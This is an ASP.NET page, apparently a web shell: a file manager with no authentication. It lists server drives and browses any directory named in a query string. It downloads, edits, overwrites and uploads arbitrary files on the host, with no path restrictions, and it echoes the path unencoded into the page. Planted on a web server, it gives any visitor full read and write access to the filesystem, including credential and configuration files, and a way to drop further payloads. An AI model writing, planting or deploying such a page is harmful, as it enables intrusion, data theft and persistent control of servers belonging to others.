<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web" %>

<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string dir = Request.QueryString["dir"];
    if (string.IsNullOrEmpty(dir))
    {
        ShowDrives();
    }
    else
    {
        ShowDirectory(dir);
    }
}

void ShowDrives()
{
    Response.Write("<h2>Drives</h2><ul>");
    DriveInfo[] drives = DriveInfo.GetDrives();
    foreach (DriveInfo drive in drives)
    {
        if (drive.IsReady)
        {
            Response.Write("<li class='dir'>[DRIVE] <a href='?dir=" + HttpUtility.UrlEncode(drive.RootDirectory.FullName) + "'>" + drive.Name + "</a></li>");
        }
    }
    Response.Write("</ul>");
}

void ShowDirectory(string path)
{
    Response.Write("<h2>Directory: " + path + "</h2>");
    Response.Write("<a href='?dir=" + HttpUtility.UrlEncode(Path.GetDirectoryName(path)) + "'>.. Parent</a><br/><br/>");

    // Folders
    Response.Write("<ul>");
    try
    {
        string[] dirs = Directory.GetDirectories(path);
        foreach (string d in dirs)
        {
            Response.Write("<li class='dir'><a href='?dir=" + HttpUtility.UrlEncode(d) + "'>" + Path.GetFileName(d) + "</a></li>");
        }

        // Files
        string[] files = Directory.GetFiles(path);
        foreach (string f in files)
        {
            Response.Write("<li class='file'>" + Path.GetFileName(f) + 
                " | <a href='?dir=" + HttpUtility.UrlEncode(path) + "&download=" + HttpUtility.UrlEncode(f) + "'>Download</a>" + 
                " | <a href='?dir=" + HttpUtility.UrlEncode(path) + "&edit=" + HttpUtility.UrlEncode(f) + "'>Edit</a></li>");
        }
    }
    catch (Exception ex)
    {
        Response.Write("<li style='color:red;'>Error: " + ex.Message + "</li>");
    }
    Response.Write("</ul>");

    // Download file
    if (!string.IsNullOrEmpty(Request.QueryString["download"]))
    {
        string fileToDownload = Request.QueryString["download"];
        Response.Clear();
        Response.ContentType = "application/octet-stream";
        Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(fileToDownload));
        Response.WriteFile(fileToDownload);
        Response.End();
    }

    // Edit file
    if (!string.IsNullOrEmpty(Request.QueryString["edit"]))
    {
        string fileToEdit = Request.QueryString["edit"];
        if (Request.HttpMethod == "POST")
        {
            string newContent = Request.Form["content"];
            File.WriteAllText(fileToEdit, newContent);
            Response.Write("<p style='color:green;'>File saved!</p>");
        }
        string content = File.ReadAllText(fileToEdit);
        Response.Write("<form method='post'><textarea name='content' rows='20' cols='100'>" + HttpUtility.HtmlEncode(content) + "</textarea><br/><input type='submit' value='Save'></form>");
    }

    // Upload
    Response.Write("<h3>Upload File</h3>");
    Response.Write("<form method='post' enctype='multipart/form-data'>");
    Response.Write("<input type='file' name='file' /> <input type='submit' value='Upload' />");
    Response.Write("</form>");

    if (IsPostBack && Request.Files.Count > 0)
    {
        HttpPostedFile file = Request.Files[0];
        string fileName = Path.GetFileName(file.FileName);
        string savePath = Path.Combine(path, fileName);
        file.SaveAs(savePath);
        Response.Write("<p style='color:green;'>File uploaded: " + fileName + "</p>");
    }
}
</script>

<style>
body { font-family: Arial; background: #f9f9f9; padding: 20px; }
h2 { color: #333; }
ul { list-style-type: none; padding-left: 0; }
li.dir a { font-weight: bold; color: #2a52be; text-decoration: none; }
li.file { color: #555; }
textarea { width: 100%; }
</style>

<body>
</body>
